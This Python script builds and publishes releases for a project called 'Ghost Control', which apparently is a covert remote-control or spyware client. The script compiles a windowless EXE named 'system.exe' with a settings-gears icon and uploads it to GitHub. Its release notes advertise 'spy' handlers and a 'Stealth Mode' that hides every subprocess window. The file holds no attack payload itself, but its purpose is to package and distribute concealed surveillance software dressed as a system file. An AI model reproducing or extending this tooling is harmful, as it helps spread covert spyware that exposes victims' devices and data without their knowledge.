# tools/release_manager.py - GitHub Release Manager
"""
Build EXE and create GitHub release with assets
"""

import os
import sys
import subprocess
import requests
import json
import shutil
from pathlib import Path

# Add parent to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from config import GITHUB_TOKEN, GITHUB_USERNAME, GITHUB_REPO, CURRENT_VERSION

# Configuration
VERSION = CURRENT_VERSION
REPO = f"{GITHUB_USERNAME}/{GITHUB_REPO}"
ICON_FILE = "settings-gears.ico"
MAIN_SCRIPT = "main.py"
OUTPUT_NAME = "system"
DIST_DIR = Path("dist")
SYSTEM_DIR = Path("system")


def check_icon():
    """Check if icon exists"""
    if Path(ICON_FILE).exists():
        print(f"✅ Icon found: {ICON_FILE}")
        return True
    else:
        print(f"⚠️ Icon not found: {ICON_FILE}")
        return False


def build_exe():
    """Build EXE with PyInstaller"""
    print("\n🔨 Building EXE...")
    
    # Clean old builds
    for folder in ['build', 'dist', '__pycache__']:
        if Path(folder).exists():
            shutil.rmtree(folder, ignore_errors=True)
    
    # PyInstaller command
    cmd = [
        sys.executable, '-m', 'PyInstaller',
        '--onefile',
        '--windowed',
        '--clean',
        '--noconfirm',
        f'--name={OUTPUT_NAME}',
    ]
    
    # Add icon if exists
    if Path(ICON_FILE).exists():
        cmd.append(f'--icon={ICON_FILE}')
    
    # Add hidden imports
    hidden_imports = [
        'telethon', 'PIL', 'psutil', 'pycryptodome',
        'aiohttp', 'asyncio', 'ctypes', 'winreg'
    ]
    for imp in hidden_imports:
        cmd.append(f'--hidden-import={imp}')
    
    # Main script
    cmd.append(MAIN_SCRIPT)
    
    print(f"Running: {' '.join(cmd)}")
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    if result.returncode != 0:
        print(f"❌ Build failed:\n{result.stderr}")
        return None
    
    exe_path = DIST_DIR / f"{OUTPUT_NAME}.exe"
    if exe_path.exists():
        print(f"✅ Build successful: {exe_path}")
        
        # Copy to system folder
        SYSTEM_DIR.mkdir(exist_ok=True)
        target = SYSTEM_DIR / f"{OUTPUT_NAME}.exe"
        shutil.copy2(exe_path, target)
        print(f"✅ Copied to: {target}")
        
        return exe_path
    else:
        print("❌ EXE not found after build")
        return None


def create_github_release(exe_path: Path):
    """Create GitHub release and upload asset"""
    
    if not GITHUB_TOKEN or GITHUB_TOKEN == "":
        print("❌ GITHUB_TOKEN not configured!")
        return False
    
    print(f"\n📦 Creating GitHub release v{VERSION}...")
    
    headers = {
        'Authorization': f'token {GITHUB_TOKEN}',
        'Accept': 'application/vnd.github.v3+json'
    }
    
    # Create release
    release_data = {
        'tag_name': f'v{VERSION}',
        'name': f'Ghost Control v{VERSION}',
        'body': f'''## 🚀 Ghost Control v{VERSION}

### ✨ What's New
- **Async Architecture**: Fully non-blocking operations
- **aiosqlite**: Async database for server
- **SmartReconnect**: Exponential backoff for network failures
- **Modular Handlers**: Split into spy, system, files modules
- **Stealth Mode**: CREATE_NO_WINDOW for all subprocesses
- **Graceful Errors**: No more crashes on missing modules

### 📥 Downloads
- `system.exe` - Windows client (ready to run)

### 📋 Changelog
See [CHANGELOG.md](CHANGELOG.md) for details.
''',
        'draft': False,
        'prerelease': False,
        'make_latest': 'true'
    }
    
    # Check if release exists
    check_url = f'https://api.github.com/repos/{REPO}/releases/tags/v{VERSION}'
    check_resp = requests.get(check_url, headers=headers)
    
    if check_resp.status_code == 200:
        print(f"⚠️ Release v{VERSION} already exists, deleting...")
        release_id = check_resp.json()['id']
        delete_url = f'https://api.github.com/repos/{REPO}/releases/{release_id}'
        requests.delete(delete_url, headers=headers)
    
    # Create new release
    create_url = f'https://api.github.com/repos/{REPO}/releases'
    resp = requests.post(create_url, headers=headers, json=release_data)
    
    if resp.status_code not in [200, 201]:
        print(f"❌ Failed to create release: {resp.text}")
        return False
    
    release = resp.json()
    upload_url = release['upload_url'].replace('{?name,label}', '')
    
    print(f"✅ Release created: {release['html_url']}")
    
    # Upload asset
    if exe_path and exe_path.exists():
        print(f"📤 Uploading {exe_path.name}...")
        
        upload_headers = {
            'Authorization': f'token {GITHUB_TOKEN}',
            'Content-Type': 'application/octet-stream'
        }
        
        with open(exe_path, 'rb') as f:
            upload_resp = requests.post(
                f"{upload_url}?name={exe_path.name}",
                headers=upload_headers,
                data=f
            )
        
        if upload_resp.status_code in [200, 201]:
            print(f"✅ Asset uploaded: {exe_path.name}")
        else:
            print(f"⚠️ Upload failed: {upload_resp.text}")
    
    return True


def main():
    print("=" * 50)
    print(f"🚀 Ghost Control Release Manager v{VERSION}")
    print("=" * 50)
    
    os.chdir(Path(__file__).parent.parent)
    
    # 1. Check icon
    check_icon()
    
    # 2. Build EXE
    exe_path = build_exe()
    
    if not exe_path:
        print("\n❌ Build failed, aborting release")
        return False
    
    # 3. Create GitHub release
    success = create_github_release(exe_path)
    
    if success:
        print("\n" + "=" * 50)
        print("✅ RELEASE COMPLETE!")
        print(f"   Version: v{VERSION}")
        print(f"   EXE: system/{OUTPUT_NAME}.exe")
        print(f"   GitHub: https://github.com/{REPO}/releases/tag/v{VERSION}")
        print("=" * 50)
    
    return success


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
